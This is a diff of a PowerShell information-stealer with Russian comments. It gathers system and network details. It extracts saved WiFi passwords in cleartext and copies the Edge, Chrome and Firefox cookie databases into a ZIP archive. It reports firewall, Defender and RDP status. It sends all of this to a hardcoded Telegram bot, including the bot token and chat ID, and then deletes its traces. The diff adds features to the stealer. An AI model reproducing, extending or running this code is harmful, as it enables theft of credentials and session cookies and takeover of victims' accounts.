@@ -1,105 +1,158 @@
-# System Information
-$computerInfo = Get-CimInstance Win32_ComputerSystem
-$osInfo = Get-CimInstance Win32_OperatingSystem
-$processor = Get-CimInstance Win32_Processor
-$memory = [math]::Round((Get-CimInstance Win32_PhysicalMemory | Measure-Object -Property Capacity -Sum).Sum/1GB, 2)
+# Основной сбор данных
+$sys = Get-CimInstance Win32_ComputerSystem
+$os = Get-CimInstance Win32_OperatingSystem
+$cpu = Get-CimInstance Win32_Processor
+$ram = [math]::Round((Get-CimInstance Win32_PhysicalMemory | Measure-Object -Property Capacity -Sum).Sum/1GB, 2)
 $gpu = (Get-CimInstance Win32_VideoController | Where-Object {$_.Name -notlike "*Remote*"} | Select-Object -First 1).Name
 $disk = Get-CimInstance Win32_LogicalDisk -Filter "DeviceID='C:'"
 
-# Network Information
-try {
-    $publicIP = (Invoke-RestMethod -Uri "http://ipinfo.io/ip" -TimeoutSec 3).Trim()
-} catch {
-    $publicIP = "Unable to retrieve"
-}
+# Сеть и WiFi
+try {$ip = (Invoke-RestMethod "http://ipinfo.io/ip" -TimeoutSec 3).Trim()} catch {$ip = "No IP"}
+$net = Get-NetIPAddress | Where-Object {$_.AddressFamily -eq 'IPv4' -and $_.IPAddress -ne '127.0.0.1'} | Select-Object InterfaceAlias, IPAddress
 
-$networkAdapters = Get-NetIPAddress | Where-Object {$_.AddressFamily -eq 'IPv4' -and $_.IPAddress -ne '127.0.0.1'} | Select-Object InterfaceAlias, IPAddress
-
-# WiFi Passwords
-$wifiInfo = ""
+$wifi = ""
 try {
-    $profiles = netsh wlan show profiles | Select-String "All User Profile"
-    foreach ($profile in $profiles) {
-        $profileName = $profile.ToString().Split(":")[1].Trim()
-        try {
-            $password = (netsh wlan show profile name="$profileName" key=clear | Select-String "Key Content").ToString().Split(":")[1].Trim()
-            $wifiInfo += "$profileName : $password`n"
-        } catch {
-            $wifiInfo += "$profileName : No password`n"
-        }
+    netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object {
+        $name = $_.ToString().Split(":")[1].Trim()
+        try {$pass = (netsh wlan show profile name="$name" key=clear | Select-String "Key Content").ToString().Split(":")[1].Trim()} catch {$pass = "No password"}
+        $wifi += "$name : $pass`n"
     }
-    if (!$wifiInfo) { $wifiInfo = "No WiFi networks found" }
-} catch {
-    $wifiInfo = "Error getting WiFi data"
-}
+    if (!$wifi) {$wifi = "No WiFi networks"}
+} catch {$wifi = "WiFi error"}
 
-# Browser Cookies
-$cookiesFiles = @()
-$tempDir = "$env:TEMP\Cookies_$(Get-Date -Format 'HHmmss')"
-New-Item -ItemType Directory -Path $tempDir -Force | Out-Null
+# Безопасность
+try {$fw = Get-NetFirewallProfile | ForEach-Object {"  - $($_.Name): $($_.Enabled)"} | Out-String} catch {$fw = "Firewall info unavailable"}
+try {$def = Get-MpComputerStatus; $defStatus = "Antivirus: $($def.AntivirusEnabled), Real-time: $($def.RealTimeProtectionEnabled)"} catch {$defStatus = "Defender info unavailable"}
+try {$rdp = if ((Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -ErrorAction 0).fDenyTSConnections -eq 1) {'Disabled'} else {'Enabled'}} catch {$rdp = "RDP status unavailable"}
 
+# Cookies - создаем ZIP архив для удобной загрузки
+$cookies = @()
+$temp = "$env:TEMP\Cookies_$(Get-Date -Format 'HHmmss')"
+$zipPath = "$env:TEMP\Cookies_$env:USERNAME.zip"
+
+New-Item -ItemType Directory -Path $temp -Force | Out-Null
+
+# Копируем файлы cookies
 $browsers = @(
     @{Name="Edge"; Path="$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Cookies"},
-    @{Name="Chrome"; Path="$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies"}
+    @{Name="Chrome"; Path="$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies"},
+    @{Name="Firefox"; Path=(Get-ChildItem "$env:APPDATA\Mozilla\Firefox\Profiles" -Filter "cookies.sqlite" -Recurse -ErrorAction 0 | Select-Object -First 1).FullName}
 )
 
 foreach ($browser in $browsers) {
-    if (Test-Path $browser.Path) {
-        $dest = "$tempDir\$($browser.Name)_Cookies"
+    if ($browser.Path -and (Test-Path $browser.Path)) {
+        $dest = "$temp\$($browser.Name)_Cookies$(if($browser.Name -eq 'Firefox'){'.sqlite'})"
         Copy-Item $browser.Path $dest -ErrorAction SilentlyContinue
         if (Test-Path $dest) {
-            $cookiesFiles += $dest
+            $cookies += $dest
+            # Создаем текстовую информацию о файле
+            $fileInfo = Get-Item $dest
+            "$($browser.Name) Cookies - Size: $([math]::Round($fileInfo.Length/1KB, 2)) KB - Modified: $($fileInfo.LastWriteTime)" | Out-File "$temp\$($browser.Name)_info.txt" -Encoding UTF8
+            $cookies += "$temp\$($browser.Name)_info.txt"
         }
     }
 }
 
-# System Uptime
-$uptime = (Get-Date) - $osInfo.LastBootUpTime
-$uptimeInfo = "$([math]::Floor($uptime.TotalHours)):$($uptime.Minutes.ToString('00'))"
+# Создаем ZIP архив с cookies
+try {
+    if (Get-Command Compress-Archive -ErrorAction SilentlyContinue) {
+        Compress-Archive -Path "$temp\*" -DestinationPath $zipPath -Force
+        if (Test-Path $zipPath) {
+            $cookies += $zipPath
+        }
+    }
+} catch {}
 
-# Create Message
-$message = @"
+# Дополнительная информация
+try {$conn = Get-NetTCPConnection -State Established | Select-Object LocalAddress, LocalPort, RemoteAddress, RemotePort -First 5 | ForEach-Object {"- $($_.LocalAddress):$($_.LocalPort) -> $($_.RemoteAddress):$($_.RemotePort)"} | Out-String} catch {$conn = "Connections unavailable"}
+try {$software = Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*","HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | Where-Object {$_.DisplayName} | Select-Object DisplayName, DisplayVersion -First 8 | ForEach-Object {"- $($_.DisplayName) v$($_.DisplayVersion)"} | Out-String} catch {$software = "Software info unavailable"}
+try {$uptime = (Get-Date) - $os.LastBootUpTime; $uptimeInfo = "$([math]::Floor($uptime.TotalHours)):$($uptime.Minutes.ToString('00'))"} catch {$uptimeInfo = "Uptime unavailable"}
+
+# Формирование и отправка сообщения
+$msg = @"
 === SYSTEM INFORMATION ===
 User: $env:USERNAME
 Computer: $env:COMPUTERNAME
-IP: $publicIP
+Domain: $env:USERDOMAIN
 
-=== HARDWARE ===
-Processor: $($processor.Name)
-RAM: $memory GB
+=== HARDWARE INFORMATION ===
+Processor: $($cpu.Name)
+RAM: $ram GB
 GPU: $gpu
-Disk C: Free: $([math]::Round($disk.FreeSpace/1GB, 1)) GB
+Disk C: Free: $([math]::Round($disk.FreeSpace/1GB, 2)) GB / Total: $([math]::Round($disk.Size/1GB, 2)) GB
+
+=== OPERATING SYSTEM ===
+OS: $($os.Caption)
+Version: $($os.Version)
+Build: $($os.BuildNumber)
+
+=== NETWORK INFORMATION ===
+Public IP: $ip
+
+Network Interfaces:
+$($net | ForEach-Object { 
+    $name = $_.InterfaceAlias -replace "Подключение по локальной сети", "Local Area Connection" -replace "Беспроводная сеть", "Wireless Network" -replace "Сетевое подключение Bluetooth", "Bluetooth Network"
+    "- $name : $($_.IPAddress)" 
+} | Out-String)
+
+Active Connections:
+$conn
 
 === WIFI PASSWORDS ===
-$wifiInfo
+$wifi
 
 === BROWSER COOKIES ===
-Found: $($cookiesFiles.Count) files
+Found cookies files: $($cookies.Count)
+Files available for download as ZIP archive
 
-=== UPTIME ===
-$uptimeInfo
+=== SECURITY STATUS ===
+Firewall: 
+$fw
+Windows Defender: $defStatus
+RDP Access: $rdp
+
+=== INSTALLED SOFTWARE ===
+$software
+
+=== SYSTEM UPTIME ===
+Uptime: $uptimeInfo
 "@
 
-# Send to Telegram
-Invoke-RestMethod -Uri "https://api.telegram.org/bot8429674512:AAEomwZivan1nhKIWx4LTlyFKJ6ztAGu8Gs/sendMessage" -Method Post -Body @{
-    chat_id = '5674514050'
-    text = $message
-}
+Invoke-RestMethod -Uri "https://api.telegram.org/bot8429674512:AAEomwZivan1nhKIWx4LTlyFKJ6ztAGu8Gs/sendMessage" -Method Post -Body @{chat_id='5674514050'; text=$msg}
 
-# Send Cookies Files
-foreach ($file in $cookiesFiles) {
-    if (Test-Path $file) {
+# Отправка ZIP архива с cookies
+if (Test-Path $zipPath) {
+    try {
+        Invoke-RestMethod -Uri "https://api.telegram.org/bot8429674512:AAEomwZivan1nhKIWx4LTlyFKJ6ztAGu8Gs/sendDocument" -Method Post -Form @{
+            chat_id = '5674514050'
+            document = [System.IO.File]::OpenRead($zipPath)
+            caption = "📁 COOKIES ARCHIVE - Download and extract to view cookies files"
+        }
+    } catch {
+        # Если не удалось отправить ZIP, отправляем файлы по отдельности
+        $cookies | Where-Object {Test-Path $_} | ForEach-Object {
+            try {
+                Invoke-RestMethod -Uri "https://api.telegram.org/bot8429674512:AAEomwZivan1nhKIWx4LTlyFKJ6ztAGu8Gs/sendDocument" -Method Post -Form @{
+                    chat_id = '5674514050'
+                    document = [System.IO.File]::OpenRead($_)
+                    caption = "Cookies file: $(Split-Path $_ -Leaf)"
+                }
+            } catch {}
+        }
+    }
+} else {
+    # Отправка отдельных файлов если ZIP не создался
+    $cookies | Where-Object {Test-Path $_} | ForEach-Object {
         try {
             Invoke-RestMethod -Uri "https://api.telegram.org/bot8429674512:AAEomwZivan1nhKIWx4LTlyFKJ6ztAGu8Gs/sendDocument" -Method Post -Form @{
                 chat_id = '5674514050'
-                document = [System.IO.File]::OpenRead($file)
-                caption = "Cookies: $(Split-Path $file -Leaf)"
+                document = [System.IO.File]::OpenRead($_)
+                caption = "Cookies file: $(Split-Path $_ -Leaf)"
             }
-        } catch {
-            # Ignore send errors
-        }
+        } catch {}
     }
 }
 
-# Cleanup
-Remove-Item $tempDir -Recurse -Force -ErrorAction SilentlyContinue
+# Очистка
+Remove-Item $temp -Recurse -Force -ErrorAction SilentlyContinue
+Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
